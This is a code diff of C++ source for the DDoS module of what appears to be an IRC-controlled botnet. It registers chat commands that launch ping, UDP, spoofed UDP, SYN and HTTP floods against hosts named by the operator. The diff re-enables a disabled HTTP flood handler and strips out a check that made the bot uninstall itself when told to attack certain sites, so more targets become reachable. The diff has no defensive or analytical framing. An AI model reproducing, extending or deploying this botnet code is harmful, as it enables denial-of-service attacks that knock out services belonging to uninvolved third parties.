@@ -7,7 +7,9 @@
 #include "httpflood.h"
 
 void CDDOS::Init()
-{	m_iNumThreads=0; m_bDDOSing=false;
+{	
+	m_iNumThreads=0;
+	m_bDDOSing=false;
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPing,			"ddos.pingflood",	"starts a Ping flood",											this);
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUDP,			"ddos.udpflood",	"starts an UDP flood",											this);
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSpoofedUDP,	"ddos.spudpflood",	"starts a spoofed UDP flood",									this);
@@ -34,46 +36,45 @@ bool CDDOS::HandleCommand(CMessage *pMsg)
         g_cMainCtrl.m_cConsDbg.Log(10, "File =%s:Line=%d:Function=%s \n",__FILE__, __LINE__, __FUNCTION__);
         g_cMainCtrl.m_cConsDbg.Log(10, "*%s* %s  \n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
 #endif
-    unsigned long lRyanAddr=ResolveAddress("www.ryan1918.com");
-	if(	!pMsg->sChatString.Token(1, " ").CompareNoCase("www.ryan1918.com") ||
-		!pMsg->sChatString.Token(1, " ").CompareNoCase("ryan1918.com") ||
-		!pMsg->sChatString.Token(1, " ").CompareNoCase("www.harr0.com") ||
-		!pMsg->sChatString.Token(1, " ").CompareNoCase("harr0.com") ||
-		!pMsg->sChatString.Token(1, " ").Compare(inet_ntoa(to_in_addr(lRyanAddr))))
-	{
-		g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "shouldnt have done that...", pMsg->sReplyTo);
-#ifdef WIN32
-		if(g_cMainCtrl.m_cBot.as_enabled.bValue) g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
-#endif
-		g_cMainCtrl.m_cInstaller.Uninstall();
-		g_cMainCtrl.m_cIRC.m_bRunning=false; g_cMainCtrl.m_bRunning=false;
-	}
-
 	if(!pMsg->sCmd.Compare("ddos.synflood"))
-	{	CDDOSSynFlood *pTemp=new CDDOSSynFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
+	{	
+		CDDOSSynFlood *pTemp=new CDDOSSynFlood; 
+		m_bDDOSing=true;
+		pTemp->m_pDDOS=this;
 		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
 		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
 		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
 		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
-		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
+		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); 
+		pTemp->m_bSilent=pMsg->bSilent; 
+		pTemp->m_bNotice=pMsg->bNotice;
 		pTemp->Start(); }
 
-/*	if(!pMsg->sCmd.Compare("ddos.httpflood"))
-	{	CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
+	if(!pMsg->sCmd.Compare("ddos.httpflood"))
+	{	
+		CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; 
+		m_bDDOSing=true; 
+		pTemp->m_pDDOS=this;
 		pTemp->m_sURL.Assign(pMsg->sChatString.Token(1, " ").CStr());
 		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
 		pTemp->m_sReferrer.Assign(pMsg->sChatString.Token(3, " ").CStr());
 		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
 		if(!pMsg->sChatString.Token(5, " ").CompareNoCase("true"))
 			pTemp->m_bRecursive=true; else pTemp->m_bRecursive=false;
-		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
-		pTemp->Start(); }*/
+		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo);
+		pTemp->m_bSilent=pMsg->bSilent;
+		pTemp->m_bNotice=pMsg->bNotice;
+		pTemp->Start(); 
+	}
 
 	if(!pMsg->sCmd.Compare("ddos.stop")) m_bDDOSing=false;
 
 	return true; }
 
 void *CDDOSBase::Run()
-{	if(!(g_cMainCtrl.m_cBot.ddos_maxthreads.iValue<m_pDDOS->m_iNumThreads))
+{	
+	if(!(g_cMainCtrl.m_cBot.ddos_maxthreads.iValue<m_pDDOS->m_iNumThreads))
 		m_pDDOS->m_iNumThreads++; StartDDOS(); m_pDDOS->m_iNumThreads--;
-	g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
+	g_cMainCtrl.m_lCanJoin.push_back(this); 
+	return NULL;
+}
